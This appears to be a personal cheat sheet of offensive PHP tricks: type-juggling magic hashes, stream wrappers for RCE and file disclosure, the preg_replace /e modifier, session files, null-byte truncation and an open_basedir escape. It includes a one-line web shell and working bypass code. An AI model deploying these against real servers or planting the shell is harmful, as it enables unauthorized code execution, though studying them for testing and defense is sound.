## PHP source code
https://github.com/php/php-src
Different versions are different branches
Internal function implementations are in `ext`, most are in `standard`.
## Determining PHP version on server
- Can be seen on response headers
## Small Remote Shell
`<? echo shell_exec($_GET['cmd']); ?>`
## Type Juggling
PHP will automatically convert types with `==` or explicit/implicit comparision.
Rules are detailed here:
- https://www.php.net/manual/en/language.types.type-juggling.php
See here for tricks:
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type%20Juggling/README.md
### Magic hashes
A string consisted entirely of digits or starting with numbers then `e` (scientific notation) will be interpreted as number in comparisons.
This can be used with hashes to cause "collision", as `0e5 == 0e12`.
Valid values are any prefix of zeros, then an `e`, then a suffix of numbers.
Some known hashes are in https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type%20Juggling/README.md#magic-hashes
With MD5 it's feasible to brute force, will not take very long.
## Special paths
On functions that access file there are a lot of available protocols (other than local files or http)
https://www.php.net/manual/en/wrappers.php
`expect://` can allow for RCE if enabled, though usually isn't.
TODO learn more options.
- `php://filter/convert.base64-encode/resource=url` can b64encode the output of URL. can be useful in `include` to see content of same file without redecleration errors
## `preg_replace` `e` modifier
When doing `preg_replace`, if `e` modifier is used on the pattern the replacement will be evaluated as PHP code before substitution.
This escapes some characters beforehand (`'`, `"`, `/` and NULL).
## Evaluating code in strings
- `$var_name` is replaced with the content of variable `$var_name`.
- `{${expression}}` will run expression as PHP code and replace it with the output of the code.
## Sessions saving
Sessions are saved in `/var/lib/php5` or in `/var/lib/php/sessions`
Session file name is always `sess_SESSIONID`
Is basically serialized data (can lead to everything that `deserialize` can, [[Insecure Deserialization]]) but not exactly the same format.
Can create using:
```php
session_start();
$_SESSION["abc"] = "def";
echo session_encode();
```
Can also parse using `session_decode`.
## Null Bytes
As PHP internal functions are implemented in C, some functions don't handle binary data well and ignore null bytes.
Those functions truncate the params at first NULL byte:
- `crypt`
- `password_hash`
- Command executions, like `exec` and `passthru` (untested)
- File system operations, like `include` and `readfile` (untested)
Those are safe and don't stop at NULL:
- `strlen`
## Bypassing `open_basedir`
- https://borelenzo.github.io/stuff/2023/01/30/php-bug.html
- https://bugs.php.net/bug.php?id=81131
- https://angelica.gitbook.io/hacktricks/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass#listing-dirs-with-glob-bypass
This works:
```php
//mkdir("some_subdirectory");
chdir("some_subdirectory");
ini_set("open_basedir", ini_get("open_basedir").":../");
chdir("..")
chdir("..")
chdir("..")
chdir("..")
chdir("..")
chdir("..")
chdir("..")
chdir("..")
# now unrestricted
```